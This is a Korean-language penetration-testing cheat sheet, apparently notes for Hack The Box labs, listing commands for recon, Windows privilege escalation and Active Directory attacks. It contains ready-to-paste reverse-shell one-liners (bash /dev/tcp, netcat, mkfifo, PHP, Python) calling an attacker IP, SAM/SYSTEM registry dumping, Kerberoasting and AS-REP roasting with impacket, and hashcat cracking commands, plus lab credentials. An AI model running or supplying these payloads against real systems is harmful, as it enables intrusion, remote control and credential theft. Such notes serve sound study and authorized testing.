
## Nmap
```bash
nmap -sCV -p- -Pn -A --min-rate 5000 10.129.5.22 -oN nmap.log
```

FFUF
```bash
ffuf -u http://10.129.9.222 -H "Host: FUZZ.usage.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
```
# Tool

| Tool name   | description        |                              |
| ----------- | ------------------ | ---------------------------- |
| GodPotato   | 권한상승               | SeImpersonatePrivilege 권한 필요 |
| SigmaPotato | 권한상승               | SeImpersonatePrivilege 권한 필요 |
| SharpHound  | AD권한 데이터수집         |                              |
| bloodhound  | AD 도메인 구성 파악 및 취약점 |                              |

# Windows
## powershell 바이패스
```dos
powershell -ep bypass
```

## 프로세스 이름 찾을 때
```powershell
Get-Process | Where-Object { $_.ProcessName -match "wevtutil" }
```

## 파일 내 문자열 찾을 때
```powershell
Select-String -Path ".\test.txt" -Pattern "찾을문자열"
```

## 사용중인 포트 찾을 때

```powershell
netstat -ano
```

## powershell 유저 권한 확인
```powershell
whoami /all
```

## SeBackupPrivilege
```powershell
reg.exe save hklm\sam sam
reg.exe save hklm\system system
download sam
download system
#impacket-secretsdump -sam sam -system system LOCAL
```


# Linux

### SSH
```bash
#id_rsa 가 누가 만든것인지
#신뢰 안 되면 그냥 `/etc/passwd`의 후보 사용자들로 하나씩 `ssh -i` 시도하는 게 확실
ssh-keygen -l -f id_rsa
2048 SHA256:PN6pyaVqalSAe2eLdTcog5/dsxHYnOaaDsqKw/vYRPs anthony@clue (RSA)
```

## 리버스쉘 페이로드
```bash
bash -i >& /dev/tcp/[내_HTB_IP]/4444 0>&1

nc [내_HTB_IP] 4444 -e /bin/bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [내_HTB_IP] 4444 >/tmp/f

php -r '$sock=fsockopen("10.10.15.161",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

#python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[내_HTB_IP]",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```



## 포트 사용하는 곳 확인
```bash
sudo netstat -tunlnp
```

## bash oneline payload
```bash
bash -c 'bash -i >& /dev/tcp/10.10.15.145/4444 0>&1'
```

## ligolo-ng
```bash
./agent -connect 192.168.45.224:11601 -ignore-cert
sudo ./proxy -selfcert
session
interface_create --name ligolo17
route_add --name ligolo --route 172.168.189.0/24
start --tun ligolo
```

## SCP
타겟에서 파일 다운받을 때
```bash
scp amay@sea.htb:/home/amay/output.txt .

#kerberos 티켓 활용하여 접근 했을 때
scp -o "GSSAPIAuthentication yes" f.frizzle@frizz.htb:'C:/\$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/*RE2XMEG.7z' ./RE2XMEG.7z

```

## SMB
### smbclient
```bash
#SMB폴더 확인
smbclient -L 10.129.45.168 -N

#계정으로 로그인
smbclient -U SVC_TGS%GPPstillStandingStrong2k18 //app.htb/Users
#smbclient prompt에서
#모든 하위 디렉토리까지 탐색 
recurse on
#대화형 모드 비활성화
prompt off
#다중 다운로드, 현재 경로 및 모든 파일 다운로드
mget *
#파일 다운로드
get user.txt
```

## BloodHound
```bash
### **BloodHound를 사용한 데이터 분석**
#config 파일 위치 /home/kali/.config/bloodhound/bloodhound.config.json


- Kali Linux에서 Neo4j 서비스 시작

`sudo neo4j start`

- 웹 인터페이스 접근

`http://localhost:7474# ID/PW - neo4j/neo4j -> neo4j/1q2w3e4r!`

- BloodHound 실행

`bloodhound`

- 종료

`pkill -f bloodhoundsudo neo4j stop`
```


### smbmap
```bash
#해당 호스트에 대하여 접근 권한 파악
smbmap -H app.htb
#해당 유저로 접근 권한 파악
smbmap -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 -H app.htb
```



## LDAP
```bash
#활성화된 관리자 계정 식별
ldapsearch -x -H 'ldap://app.htb' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
#비밀번호 해시를 추출할 수 있는 서비스계정 추출
ldapsearch -x -H 'ldap://app.htb' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
```

## netexec
```bash
#AD 인프라 내에서 권한 상승이 가능한 취약한 설정 탐색
netexec ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' -M adcs
```


## impacket
```bash
#서버에 이용 가능한 유저 추출
python3 GetADUsers.py -all active.htb/svc_tgs -dc-ip app.htb
#특정 서비스를 실행하기위한 계정 SPN
python3 GetUserSPNs.py active.htb/svc_tgs -dc-ip app.htb
#해시값 추출
python3 GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip app.htb -request
#이름 또는 계정명으로 브루트포스 as-rep비밀번호 모를 때
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile username.txt -dc-ip 10.129.95.180




```


### ### 1. 원격 명령 실행 및 포스트 익스플로잇 (Execution)

타겟의 자격 증명을 확보한 후, 시스템 제어권을 얻기 위해 사용합니다.

| **도구명**                | **주요 기능**                | **실무 포인트**                               |
| ---------------------- | ------------------------ | ---------------------------------------- |
| **`impacket-psexec`**  | 서비스 등록 방식 원격 쉘 실행        | `SYSTEM` 권한 획득 가능, 흔적이 많이 남음(EDR 탐지율 높음) |
| **`impacket-wmiexec`** | WMI를 이용한 반대화형 쉘 실행       | 파일 생성을 최소화하여 `psexec`보다 은밀함 (가장 권장됨)     |
| **`impacket-smbexec`** | 서비스 생성/삭제 방식 명령 실행       | 별도의 에이전트 없이 동작, `psexec`과 유사한 메커니즘       |
| **`impacket-atexec`**  | Task Scheduler를 통한 명령 실행 | 특정 시간에 작업을 예약하여 실행할 때 사용                 |

---

### 2. 자격 증명 탈취 및 덤핑 (Credential Dumping)

인증 정보를 수집하거나 로컬/도메인 DB에서 해시를 추출합니다.

|**도구명**|**주요 기능**|**실무 포인트**|
|---|---|---|
|**`impacket-secretsdump`**|**필수 도구.** SAM, LSA, NTDS.dit 덤프|원격에서 해시(NTLM) 및 자격 증명 추출 (DCSync 공격 포함)|
|**`impacket-smbserver`**|로컬 SMB 공유 서버 생성|타겟의 연결을 유도해 Net-NTLM 해시를 수집(Relay 준비)|
|**`impacket-mimikatz`**|원격 Mimikatz 실행|메모리상에 남은 평문 비밀번호 및 티켓 추출|
|**`impacket-dpapi`**|DPAPI 복호화|브라우저 저장 비밀번호나 암호화된 백업 파일 복호화|

---

### 3. Active Directory 및 Kerberos 공격 (AD Attacks)

도메인 환경의 구성 결함을 공략합니다.

|**도구명**|**주요 기능**|**실무 포인트**|
|---|---|---|
|**`impacket-GetUserSPNs`**|**Kerberoasting** 공격|서비스 계정(SPN)의 티켓을 요청해 오프라인 크래킹 시도|
|**`impacket-GetNPUsers`**|**AS-REP Roasting** 공격|사전 인증 미설정 유저의 TGT를 요청해 해시 탈취|
|**`impacket-ntlmrelayx`**|**NTLM Relay** 공격|가로챈 인증 정보를 다른 서버로 전달해 명령 실행/덤프 수행|
|**`impacket-getST`**|서비스 티켓(ST) 요청|위임(Delegation) 공격 시 티켓을 요청하고 파일로 저장|
|**`impacket-ticketer`**|Golden/Silver Ticket 생성|도메인 장악 후 영구적인 백도어(Persistence) 확보 용도|

---

### 4. 정보 수집 및 열거 (Enumeration)

공격 전 타겟의 내부 구조와 유저 리스트를 파악합니다.

| **도구명**                  | **주요 기능**       | **실무 포인트**                 |
| ------------------------ | --------------- | -------------------------- |
| **`impacket-lookupsid`** | SID 브루트포싱 유저 열거 | 유효한 유저 리스트 및 그룹 정보 수집      |
| **`impacket-samrdump`**  | SAM 엔드포인트 정보 추출 | 로컬 유저 및 권한 파악              |
| **`impacket-rpcdump`**   | RPC 엔드포인트 매핑    | 실행 중인 서비스와 취약한 인터페이스 탐색    |
| **`impacket-smbclient`** | SMB 공유 폴더 클라이언트 | 유효한 계정으로 접근 가능한 파일 및 폴더 탐색 |
## Windows 취약한 권한

| **권한 명칭**                    | **공격 기법 및 설명**                                                                      |
| ---------------------------- | ----------------------------------------------------------------------------------- |
| **SeImpersonatePrivilege**   | **가장 중요.** 클라이언트 인증 후 토큰을 사칭할 수 있음. `Juicy/God/PrintPotato` 공격으로 `SYSTEM` 권한 획득 가능. |
| **SeAssignPrimaryToken**     | 위와 유사하게 프로세스 토큰을 할당할 수 있음. `Potato` 계열 공격에 사용됨.                                     |
| **SeBackupPrivilege**        | 시스템의 모든 파일(SAM, SYSTEM 하이브 포함)을 읽을 수 있음. 해시 추출 후 `Pass-the-Hash` 가능.                |
| **SeRestorePrivilege**       | 시스템 파일에 쓰기 권한을 가짐. 서비스 바이너리나 DLL을 교체하여 권한 상승 가능.                                    |
| **SeTakeOwnershipPrivilege** | 파일이나 개체의 소유권을 강제로 가져올 수 있음. 이후 권한을 수정하여 백도어 설치 가능.                                  |
| **SeLoadDriverPrivilege**    | 장치 드라이버를 로드할 수 있음. 취약한 드라이버를 올려 커널 레벨에서 코드 실행 가능.                                   |
| **SeDebugPrivilege**         | 다른 프로세스(예: `lsass.exe`)의 메모리를 읽고 쓸 수 있음. 관리자 비밀번호/해시 덤프 가능.                         |




## Crypto

| Identifier | Name   |
| ---------- | ------ |
| `$2y$`     | bcrypt |

# Hashcat
```bash
hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
```

## Commonly Used Modes (-m)

| **ID** | **알고리즘 (Algorithm)**                                            |
| ------ | --------------------------------------------------------------- |
| 0      | MD5                                                             |
| 10     | MD5 ($pass.$salt)                                               |
| 20     | MD5 ($salt.$pass)                                               |
| 110    | SHA1:salt                                                       |
| 120    | SHA1:pass                                                       |
| 131    | MSSQL (2000)                                                    |
| 132    | MSSQL (2005)                                                    |
| 200    | MySQL323                                                        |
| 300    | MySQL4.1/MySQL5                                                 |
| 400    | phpass                                                          |
| 900    | MD4                                                             |
| 1000   | NTLM                                                            |
| 1100   | Domain Cached Credentials (DCC), MS Cache                       |
| 1600   | Apache $apr1$ MD5, md5apr1, MD5 (APR)                           |
| 1700   | SHA2-512                                                        |
| 1731   | MSSQL (2012, 2014)                                              |
| 1800   | sha512crypt $6$, SHA512 (Unix)                                  |
| 2500   | WPA/WPA2                                                        |
| 2501   | WPA/WPA2 PMK                                                    |
| 2600   | md5(md5($pass))                                                 |
| 3000   | LM                                                              |
| 3200   | bcrypt                                                          |
| 4500   | sha1(sha1($pass))                                               |
| 4800   | iSCSI CHAP authentication, MD5(CHAP)                            |
| 5200   | Password Safe v3                                                |
| 5500   | NetNTLMv1 / NetNTLMv1+ESS                                       |
| 5600   | NetNTLMv2                                                       |
| 5700   | Cisco-IOS type 4 (SHA256)                                       |
| 6800   | LastPass + LastPass sniffed                                     |
| 7300   | IPMI 2 RAKP HMAC-SHA1                                           |
| 7350   | IPMI2 RAKP HMAC-MD5                                             |
| 7400   | sha256crypt $5$, SHA256 (Unix)                                  |
| 7500   | Kerberos 5, etype 23, AS-REQ Pre-Auth                           |
| 8100   | Citrix NetScaler (SHA1)                                         |
| 8300   | DNSSEC (NSEC3)                                                  |
| 8900   | scrypt                                                          |
| 9500   | MS Office 2010                                                  |
| 9600   | MSOffice 2013                                                   |
| 11600  | 7Zip                                                            |
| 12800  | MS-AzureSync PBKDF2-HMAC-SHA256                                 |
| 13100  | Kerberos 5, etype 23, TGS-REP                                   |
| 13400  | KeePass 1 (AES/Twofish) and KeePass 2 (AES)                     |
| 13600  | WinZip                                                          |
| 15000  | FileZilla Server > 0.9.55                                       |
| 18200  | Kerberos 5, etype 23, AS-REP                                    |
| 19600  | Kerberos 5, etype 17, TGS-REP                                   |
| 19700  | Kerberos 5, etype 18, TGS-REP                                   |
| 19800  | Kerberos 5, etype 17, Pre-Auth                                  |
| 19900  | Kerberos 5, etype 18, Pre-Auth                                  |
| 22100  | Bitlocker                                                       |
| 22400  | AES Crypt (SHA256)                                              |
| 27000  | NetNTLMv1 / NetNTLMv1+ESS (NT)                                  |
| 27100  | NetNTLMv2 (NT)                                                  |
| 27300  | SNMPv3 HMAC-SHA512-384                                          |
| 28900  | Kerberos 5, etype 18, DB                                        |
| 29521  | LUKS v1 SHA-256 + AES                                           |
| 29700  | KeePass 1 (AES/Twofish) and KeePass 2 (AES) – keyfile only mode |



